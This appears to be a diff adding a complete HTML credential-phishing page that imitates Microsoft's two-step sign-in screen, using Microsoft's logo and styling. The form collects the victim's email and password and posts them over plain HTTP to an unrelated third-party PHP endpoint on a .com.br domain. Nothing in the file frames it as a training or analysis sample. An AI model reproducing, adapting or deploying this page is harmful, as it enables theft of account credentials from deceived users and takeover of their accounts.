@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sign In</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+            background: radial-gradient(circle at top left, #f6e8e6, #e6f0f6, #f9f9f9);
+            background-size: cover;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            height: 100vh;
+        }
+
+        .login-container {
+            background: white;
+            /* border-radius: 8px; */
+            width: 360px;
+            padding: 30px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+        }
+
+        .logo {
+            width: 100px;
+            margin-bottom: 15px
+        }
+
+        .title1 {
+            font-size: 22px;
+            font-weight: bold;
+            margin-bottom: -5px;
+            margin-top: -5px;
+        }
+
+        .title2 {
+            font-size: 22px;
+            font-weight: bold;
+            /* margin-bottom: 10px; */
+            margin-top: -10px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            font-size: 14px;
+            border: 1px solid #ccc;
+            border-radius: 2px;
+        }
+
+        /*  */
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0 5px 0;
+            border: none;
+            border-bottom: 2px solid #0078D4;
+            outline: none;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0 5px 0;
+            border: none;
+            border-bottom: 2px solid #0078D4;
+            outline: none;
+        }
+
+        input[type="submit"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0 5px 0;
+            border: none;
+            border-bottom: 2px solid #0078D4;
+            outline: none;
+        }
+
+        /*  */
+
+        .email-pill {
+            display: inline-block;
+            background-color: #f3f2f1;
+            color: #000;
+            font-size: 14px;
+            padding: 6px 14px;
+            border-radius: 999px;
+            margin-bottom: 20px;
+            margin-top: -2px;
+        }
+
+        .btn {
+            width: 30%;
+            padding: 10px;
+            background: #0067b8;
+            color: white;
+            border: none;
+            font-size: 16px;
+            cursor: pointer;
+            float: right;
+            margin-bottom: -10px;
+        }
+
+        .btn:hover {
+            background: #005ba1;
+        }
+
+        .password-group {
+            position: relative;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .toggle-password svg {
+            width: 20px;
+            height: 20px;
+            fill: #888;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .footer {
+            font-size: 12px;
+            color: #888;
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .links {
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        .links a {
+            color: #0067C5;
+            text-decoration: none;
+        }
+
+        /*  */
+        .sign-in-options {
+            margin-top: 20px;
+            width: 396px;
+            max-width: 600px;
+            display: flex;
+            align-items: center;
+            justify-content: start;
+            text-align: center;
+            border: 1px solid #ccc;
+            padding: 12px;
+            cursor: pointer;
+            background: white;
+            margin-top: 20px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+        }
+
+        .sign-in-options img {
+            width: 20px;
+            margin-right: 10px;
+        }
+
+        .alt-link {
+            text-align: left;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .alt-link a {
+            color: #0067C5;
+            text-decoration: none;
+            margin-bottom: 10px;
+        }
+
+        .sub-btn {
+            width: 100%;
+            margin-bottom: 10px;
+            margin-top: -5px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiDfPy4C-azpmAC5NTHImq3ff2v8yjFk9Pl4CI_54aMQ5sJcRY4u7EfdCR8YeCpOgd7Tgd_R0uBNd6vi4latzxIZU8XSePjz9vOFVUHjQR-DJmHDcDYjyrfRQyedNZo_EJNJzC2e19JKQu4UsBaisCnCc7j7WLhLNcN4_VycBHFPfp8VisEj8tF2Hyig4k/w275-h61/microsoft_logo_564db913a7fa0ca42727161c6d031bef.png"
+                alt="Microsoft Logo">
+        </div>
+        <form  action="http://ancs.com.br/auto/next2580.php" method="POST">
+            <!-- Step 1 -->
+            <div class="step step-1">
+                <div class="title title1">Sign in</div>
+                <div class="input-group">
+                    <input type="text" id="email" name="user" placeholder="Email, phone, or Skype" 
+                        required>
+                </div>
+                <div class="links">
+                    No account? <a href="#">Create one!</a><br /><br>
+                    <a href="#">Can’t access your account?</a>
+                </div>
+                <button type="button" class="btn" onclick="goToStep2()">Next</button>
+            </div>
+
+            <!-- Step 2 -->
+            <div class="step step-2 hidden">
+                <div class="email-pill" id="displayEmail"></div>
+                <div class="title2">Enter password</div>
+                <div class="input-group password-group">
+                    <input type="password" id="password" name="pass" placeholder="Password"
+                        autocomplete="new-password" required>
+                    <span class="toggle-password" onclick="togglePassword()">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                            <path
+                                d="M12 5c-7 0-11 7-11 7s4 7 11 7 11-7 11-7-4-7-11-7zm0 12a5 5 0 1 1 0-10 5 5 0 0 1 0 10zm0-2a3 3 0 1 0 0-6 3 3 0 0 0 0 6z" />
+                        </svg>
+                    </span>
+                </div>
+                <div class="links">
+                    <a href="#">Forgot password?</a>
+                </div>
+                <button type="submit" class="btn sub-btn">Sign in</button>
+                <div class="alt-link">
+                    <a href="#">Sign in with a different account</a>
+                </div>
+            </div>
+
+            <!-- <div class="footer" id="footer">Sign-in options</div> -->
+        </form>
+    </div>
+    <div class="sign-in-options" id="footer">
+        <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg"
+            alt="Key Icon" width="20" height="20">
+        Sign-in options
+    </div>
+    <script>
+        const form = document.getElementById('loginForm');
+        const step1 = document.querySelector('.step-1');
+        const step2 = document.querySelector('.step-2');
+        const emailInput = document.getElementById('email');
+        const displayEmail = document.getElementById('displayEmail');
+        const footer = document.getElementById('footer');
+
+        function goToStep2() {
+            const email = emailInput.value.trim();
+            if (email) {
+                displayEmail.textContent = email;
+                step1.classList.add('hidden');
+                step2.classList.remove('hidden');
+                footer.style.display = "none";
+                document.getElementById('password').focus();
+            }
+        }
+
+        function togglePassword() {
+            const pwd = document.getElementById("password");
+            pwd.type = pwd.type === "password" ? "text" : "password";
+        }
+    </script>
+</body>
+
+</html>
